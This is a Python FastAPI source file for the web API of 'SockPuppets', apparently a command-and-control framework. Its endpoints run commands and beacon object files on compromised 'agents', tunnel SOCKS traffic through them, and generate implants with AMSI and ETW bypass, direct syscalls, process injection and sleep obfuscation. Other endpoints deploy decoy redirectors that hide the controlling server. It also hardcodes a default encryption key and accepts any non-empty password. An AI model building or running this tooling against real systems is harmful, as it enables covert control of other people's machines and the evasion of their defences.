"""REST API endpoints for the SockPuppets GUI."""

import asyncio
import os
from pathlib import Path

from fastapi import APIRouter, Depends, HTTPException, Request
from pydantic import BaseModel

from gui.auth import operators

router = APIRouter(prefix="/api")
auth_router = APIRouter(prefix="/api/auth")

# These get set by create_app
_server = None
_auth_dep = None
_loop = None


def init(server, auth_dep, loop=None):
    global _server, _auth_dep, _loop
    _server = server
    _auth_dep = auth_dep
    _loop = loop


# --- Auth request models ---

class LoginRequest(BaseModel):
    username: str
    password: str

class ChangePasswordRequest(BaseModel):
    new_password: str


# --- Auth endpoints (unprotected) ---

@auth_router.post("/login")
async def login(req: LoginRequest):
    name, must_change = operators.verify(req.username, req.password)
    if name is None:
        raise HTTPException(status_code=401, detail="Invalid username or password")
    session_token = operators.create_session(name)
    return {"token": session_token, "operator": name, "must_change_password": must_change}


@auth_router.post("/change-password")
async def change_password(req: ChangePasswordRequest, request: Request):
    auth = request.headers.get("Authorization", "")
    if not auth.startswith("Bearer "):
        raise HTTPException(status_code=401, detail="Missing auth token")
    token = auth[7:]
    name = operators.verify_session(token)
    if name is None:
        raise HTTPException(status_code=401, detail="Invalid session")
    if not req.new_password or len(req.new_password) < 1:
        raise HTTPException(status_code=400, detail="Password cannot be empty")
    operators.change_password(name, req.new_password)
    new_token = operators.create_session(name)
    return {"status": "ok", "message": "Password changed successfully", "token": new_token}


# --- Request models ---

class CommandRequest(BaseModel):
    command: str

class SleepRequest(BaseModel):
    interval: int

class DowngradeRequest(BaseModel):
    interval: int = 60

class SocksRequest(BaseModel):
    port: int

class GenerateRequest(BaseModel):
    host: str
    port: int
    key: str = "SOCKPUPPETS_KEY_2026"
    beacon_mode: bool = False
    interval: int = 60
    jitter: int = 0
    amsi: bool = False
    etw: bool = False
    syscalls: str | None = None
    inject: str | None = None
    inject_target: str | None = None
    sleep_obf: str | None = None
    idle_encrypt: int = 30
    profile: str = "default"
    patterns: str = "default"
    redirector: str | None = None
    target_os: str = "auto"
    bof: bool = False
    obfuscation: str | None = None
    output_format: str = "exe"
    shellcode_format: str = "raw"
    lang: str = "go"

class BOFRequest(BaseModel):
    bof_data: str
    args: str = ""
    entry: str = "go"

class DeployRequest(BaseModel):
    format: str


# --- Server control ---

@router.get("/server/status")
async def server_status():
    return {
        "running": _server is not None and hasattr(_server, 'ws_server') and _server.ws_server is not None,
        "host": getattr(_server, 'host', ''),
        "port": getattr(_server, 'port', 0),
        "agent_count": len(_server.agents) if _server else 0,
    }


# --- Agents ---

@router.get("/agents")
async def list_agents():
    if not _server:
        return []
    agents = _server.get_agent_list()
    active_ids = {a['id'] for a in _server.get_active_agents()}
    for agent in agents:
        agent['active'] = agent['id'] in active_ids
        warning = _server.check_agent_health(agent['id'])
        agent['health_warning'] = warning
    return agents


@router.get("/agents/{agent_id}")
async def get_agent(agent_id: str):
    if not _server or agent_id not in _server.agents:
        raise HTTPException(status_code=404, detail="Agent not found")
    agent = _server.agents[agent_id]
    info = agent.get_info()
    info['active'] = agent.websocket in _server.active_connections
    info['health_warning'] = _server.check_agent_health(agent_id)
    info['command_history'] = agent.command_history[-50:]
    return info


@router.post("/agents/{agent_id}/command")
async def send_command(agent_id: str, req: CommandRequest):
    if not _server or agent_id not in _server.agents:
        raise HTTPException(status_code=404, detail="Agent not found")
    result = await _server.send_command_to_agent(agent_id, req.command)
    agent = _server.agents.get(agent_id)
    if agent and agent.mode == "beacon":
        return {"queued": True, "message": result}
    return {"output": result}


@router.get("/agents/{agent_id}/results")
async def get_results(agent_id: str, clear: bool = False):
    if not _server or agent_id not in _server.agents:
        raise HTTPException(status_code=404, detail="Agent not found")
    return _server.get_agent_results(agent_id, clear=clear)


@router.post("/agents/{agent_id}/kill")
async def kill_agent(agent_id: str):
    if not _server or agent_id not in _server.agents:
        raise HTTPException(status_code=404, detail="Agent not found")
    result = await _server.kill_agent(agent_id)
    return {"status": "ok", "message": result}


@router.post("/agents/{agent_id}/bof")
async def execute_bof(agent_id: str, req: BOFRequest):
    if not _server or agent_id not in _server.agents:
        raise HTTPException(404, "Agent not found")
    result = await _server.send_bof_to_agent(agent_id, req.bof_data, req.args, req.entry)
    return {"output": result}


@router.post("/agents/{agent_id}/sleep")
async def set_sleep(agent_id: str, req: SleepRequest):
    if not _server or agent_id not in _server.agents:
        raise HTTPException(status_code=404, detail="Agent not found")
    result = await _server.set_beacon_interval(agent_id, req.interval)
    return {"status": "ok", "message": result}


@router.post("/agents/{agent_id}/upgrade")
async def upgrade_agent(agent_id: str):
    if not _server or agent_id not in _server.agents:
        raise HTTPException(status_code=404, detail="Agent not found")
    result = await _server.upgrade_to_streaming(agent_id)
    return {"status": "ok", "message": result}


@router.post("/agents/{agent_id}/downgrade")
async def downgrade_agent(agent_id: str, req: DowngradeRequest):
    if not _server or agent_id not in _server.agents:
        raise HTTPException(status_code=404, detail="Agent not found")
    result = await _server.downgrade_to_beacon(agent_id, req.interval)
    return {"status": "ok", "message": result}


@router.post("/agents/{agent_id}/socks")
async def start_socks(agent_id: str, req: SocksRequest):
    if not _server or agent_id not in _server.agents:
        raise HTTPException(status_code=404, detail="Agent not found")
    result = await _server.start_socks_proxy(agent_id, req.port)
    return {"status": "ok", "message": result}


@router.delete("/agents/{agent_id}")
async def remove_agent(agent_id: str):
    if not _server or agent_id not in _server.agents:
        raise HTTPException(status_code=404, detail="Agent not found")
    agent = _server.agents[agent_id]
    if agent.websocket in _server.active_connections:
        _server.active_connections.discard(agent.websocket)
    del _server.agents[agent_id]
    return {"status": "ok", "message": f"Agent {agent_id} removed"}


# --- Payload generation ---

@router.post("/generate")
async def generate_agents(req: GenerateRequest):
    from agent import AgentGenerator
    generator = AgentGenerator(patterns=req.patterns)
    results = {}

    if req.lang in ('go', 'all'):
        try:
            go_path = generator.generate_go_agent(
                req.host, req.port, encryption_key=req.key,
                transport='websocket' if req.beacon_mode else 'http',
                beacon_interval=req.interval, beacon_jitter=req.jitter,
                target_os=req.target_os if req.target_os != 'auto' else 'windows',
                target_arch='amd64', garble=False,
                output_format=req.output_format,
            )
            results['go'] = go_path
        except Exception as e:
            results['go'] = f"Error: {e}"

    if req.lang in ('python', 'all'):
        py_results = generator.generate_all(
            c2_host=req.host, c2_port=req.port, encryption_key=req.key,
            beacon_mode=req.beacon_mode, beacon_interval=req.interval, beacon_jitter=req.jitter,
            compile_dll=(req.output_format == 'dll'),
            generate_shellcode=(req.output_format == 'shellcode'),
            shellcode_format=req.shellcode_format,
            amsi=req.amsi, etw=req.etw, syscalls=req.syscalls,
            inject=req.inject, inject_target=req.inject_target,
            sleep_obf=req.sleep_obf, idle_encrypt=req.idle_encrypt,
            profile=req.profile, target_os=req.target_os, redirector=req.redirector,
            bof=req.bof, obfuscation=req.obfuscation,
        )
        results.update(py_results)

    generated_keys = getattr(generator, 'generated_keys', [])
    if generated_keys and _server:
        for k in generated_keys:
            _server.add_encryption_key(k)
    return {"agents": results}


@router.get("/profiles")
async def list_profiles():
    profiles_dir = Path(__file__).parent.parent / "profiles"
    result = []
    for d in [profiles_dir / "private", profiles_dir]:
        if not d.is_dir():
            continue
        for f in sorted(d.glob("*.yaml")):
            name = f.stem
            if any(p["name"] == name for p in result):
                continue
            try:
                import yaml
                with open(f) as fh:
                    data = yaml.safe_load(fh) or {}
                result.append({"name": name, "description": data.get("description", "")})
            except Exception:
                result.append({"name": name, "description": ""})
    return result


@router.get("/patterns")
async def list_patterns():
    patterns_dir = Path(__file__).parent.parent / "patterns"
    result = []
    for d in [patterns_dir / "private", patterns_dir]:
        if not d.is_dir():
            continue
        for f in sorted(d.glob("*.py")):
            if f.name.startswith("_"):
                continue
            result.append({"name": f.stem})
    return result


@router.get("/download/{filename:path}")
async def download_file(filename: str):
    from fastapi.responses import FileResponse
    output_dir = Path(__file__).parent.parent / "output"
    file_path = output_dir / filename
    if not file_path.exists() or not file_path.resolve().is_relative_to(output_dir.resolve()):
        raise HTTPException(status_code=404, detail="File not found")
    return FileResponse(file_path, filename=file_path.name)


# --- Redirectors ---

@router.get("/redirectors")
async def list_redirectors_api():
    from redirectors import list_redirectors
    configs = list_redirectors()
    return [
        {"name": c.name, "type": c.type, "domain": c.domain, "backend": c.backend, "description": c.description}
        for c in configs
    ]


@router.get("/redirectors/{name}")
async def get_redirector(name: str):
    from redirectors import load_redirector
    try:
        config = load_redirector(name)
        return {
            "name": config.name, "type": config.type, "domain": config.domain,
            "backend": config.backend, "listen": config.listen, "trusted": config.trusted,
            "profile": config.profile, "allow_user_agents": config.allow_user_agents,
            "decoy": config.decoy, "decoy_target": config.decoy_target,
        }
    except FileNotFoundError:
        raise HTTPException(status_code=404, detail=f"Redirector not found: {name}")


@router.post("/redirectors/{name}/deploy")
async def deploy_redirector(name: str, req: DeployRequest):
    from redirectors import load_redirector, generate_deploy_config
    try:
        config = load_redirector(name)
        output = generate_deploy_config(config, req.format)
        return {"config_text": output}
    except FileNotFoundError:
        raise HTTPException(status_code=404, detail=f"Redirector not found: {name}")
    except ValueError as e:
        raise HTTPException(status_code=400, detail=str(e))


# --- Infrastructure ---

@router.get("/infrastructure")
async def get_infrastructure():
    from redirectors import list_redirectors
    agents = _server.get_agent_list() if _server else []
    active_ids = {a['id'] for a in _server.get_active_agents()} if _server else set()
    redirectors = [
        {"name": c.name, "type": c.type, "domain": c.domain, "backend": c.backend}
        for c in list_redirectors() if c.type != "direct"
    ]
    return {
        "server": {
            "running": _server is not None and hasattr(_server, 'ws_server') and _server.ws_server is not None,
            "host": getattr(_server, 'host', ''),
            "port": getattr(_server, 'port', 0),
        },
        "redirectors": redirectors,
        "agents": [
            {"id": a['id'], "hostname": a['hostname'], "mode": a['mode'], "active": a['id'] in active_ids}
            for a in agents
        ],
    }
